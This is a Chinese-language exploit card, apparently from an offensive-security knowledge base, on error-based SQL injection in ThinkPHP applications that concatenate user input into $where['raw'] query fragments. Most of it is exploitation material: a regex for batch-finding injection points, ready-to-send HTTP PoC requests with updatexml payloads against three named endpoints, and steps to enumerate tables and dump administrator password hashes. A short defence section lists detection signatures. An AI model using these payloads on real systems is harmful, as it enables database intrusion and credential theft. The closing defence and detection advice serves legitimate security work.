---
id: web-generic-sqli-thinkphp-where-raw-array-fragment-injection
title: ThinkPHP 查询数组 raw 键原样拼接：前台订单/客服/查单接口 where['raw'] 用户输入报错 SQL 注入
type: scenario
domain: web
path: web/generic/sqli
technique: thinkphp-where-raw-fragment-injection
aliases:
- where['raw'] 注入
- ThinkPHP raw 条件注入
- TP 查询构造器 raw 片段
- orderData 报错注入
- Layim getMessagePage 注入
tags:
- php
- thinkphp
- sqli
- raw
- error-based
- code-audit
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V432
  verified_at: '2026-11-09T18:59:27+08:00'
  notes: 已对照原文及 18 张图核对：getData/getMessagePage/queryOrderPage 三处 $where['raw'] 拼接、orderData/type=friend&id/orderId payload、updatexml 报错回显(database()、5.6.50-log)与截图一致；全局正则命中控制器清单准确。注意 raw 键可能来自该 CMS 自定义查询封装而非 TP 原生 where（原文措辞为 Db 类或其他类似构建器，未核实版本），沿用原文表述，不影响手法可用性。原文未给版本，已 clear。dedup 与 TP3 特殊键注入卡仅 related，非同链。
---

## 一句话结论

ThinkPHP 业务代码把用户可控参数拼进查询条件数组的 `$where['raw']` 键时，该值会被当作原始 SQL 片段直接拼入 WHERE、不做引号转义；因此订单 `getData`、客服 `getMessagePage`、查单 `queryOrderPage` 等前台接口的 `orderData`/`id`/`orderId` 参数可直接报错注入，读出数据库名与版本。

## 原理

- ThinkPHP 的查询条件数组对普通键值会转义：把 `['order_value' => ['like', '%'.$v.'%']]` 交给查询构造器时，值中的单双引号会被处理（原文通过 general_log 观察到 where 会转义引号）。
- `raw` 键的语义不同：代码形如 `$where['raw'] = 'tb.order_id= "' . $orderData . '" or tb.order_value like "%' . $orderData . '"'`，等于告诉查询构造器「这一段是原始 SQL，不要处理」。用户输入被直接拼接进该片段，闭合引号后可注入任意 SQL。
- 注入位置位于 WHERE 的括号/AND 组合中，实际闭合需要按业务拼出的 SQL 结构调整。原文在 `getData` 中用 `")` 闭合外层括号并 `and ("1"="1` 收尾，payload 为：
  `orderData=") and updatexml(1,concat(0x7e,database(),0x7e),1) and ("1"="1`
  页面返回 `XPATH syntax error: '~<database>~'`，说明 updatexml 报错注入成立。
- 同类 `raw` 用法在同一套源码中可被全局正则 `\$where\['raw` 一次性定位（原文命中 `GptController`、`LayimController`、`ChadanController`、`IndexController`、`MessageController`、`OrderController` 等），再按路由逐个确认参数可控性即可批量找注入点。

## 触发条件

- 目标为 ThinkPHP 系应用（原文未注明具体版本），业务代码使用 `$where['raw']` 拼接用户输入；
- 接口可从前台访问（部分接口需要普通用户登录态/会话 Cookie）；
- 数据库为 MySQL 且错误信息回显（或其他可回显/可布尔化的注入面），支持 updatexml 等报错函数。

## 利用步骤

1. 源码审计：全局搜索 `$where['raw` 与 `post(`，列出 raw 片段中引用的变量；结合 app 目录与路由（第一层 app 下目录、第二层 XxxController.php、第三层方法）定位前台可达接口。
2. 对每个候选接口发送畸形 payload，观察回显/日志，确认闭合方式与注入点。
3. 订单接口 `POST /user/order/getData`：`orderData=") and updatexml(1,concat(0x7e,database(),0x7e),1) and ("1"="1`，先读 database()。
4. 客服接口 `POST /im/Layim/getMessagePage`：需带 `type=friend` 才进入 raw 分支，`id=") and updatexml(1,concat(0x7e,version(),0x7e),1) and ("1"="1` 读版本。
5. 查单接口 `POST /index/chadan/queryOrderPage`：`orderId=") and updatexml(1,concat(0x7e,version(),0x7e),1) and ("1"="1`。
6. 将 updatexml 中的查询替换为库名/表名/列名枚举，导出管理员表密文；注意 updatexml 报错长度限制，长数据可分段读取。

## PoC

```http
POST /user/order/getData HTTP/1.1
Content-Type: application/x-www-form-urlencoded

orderData=") and updatexml(1,concat(0x7e,database(),0x7e),1) and ("1"="1
```

```http
POST /im/Layim/getMessagePage HTTP/1.1
Content-Type: application/x-www-form-urlencoded

type=friend&id=") and updatexml(1,concat(0x7e,version(),0x7e),1) and ("1"="1
```

```http
POST /index/chadan/queryOrderPage HTTP/1.1
Content-Type: application/x-www-form-urlencoded

orderId=") and updatexml(1,concat(0x7e,version(),0x7e),1) and ("1"="1
```

原文实测前两处分别回显数据库名与 MySQL 5.6.50-log 版本，第三处回显版本，均证明 raw 片段注入。

## 变体与关联

- 变体：`raw` 片段位置不同，闭合字符可能从 `")` 变为 `')`/`)`；按业务 SQL 与报错调整。
- 变体：无报错回显时可改为时间盲注或布尔盲注。
- 关联：库内其它 ThinkPHP 条件数组注入（TP3 `_string/_complex` 特殊键、TP5 order 数组 key 注入）思路相同，但本卡的 sink 是业务层 `raw` 片段而非框架解析器特殊键。

## 检测与防御

- 审计侧：对 `$where['raw']`、`whereRaw()` 等原始片段接口做参数白名单，禁止把 `post()`/`request()` 值直接拼入 raw；全局正则审计可快速发现同类点。
- 开发侧：需要原始 SQL 时使用参数绑定（bind）而非字符串拼接；对订单号等做类型强转（intval/正则）后再拼接。
- 检测：数据库 general_log/慢日志中出现 updatexml、extractvalue、concat(0x7e 等报错注入特征；WAF 侧关注 orderData/id/orderId 等参数中的引号与函数关键字。
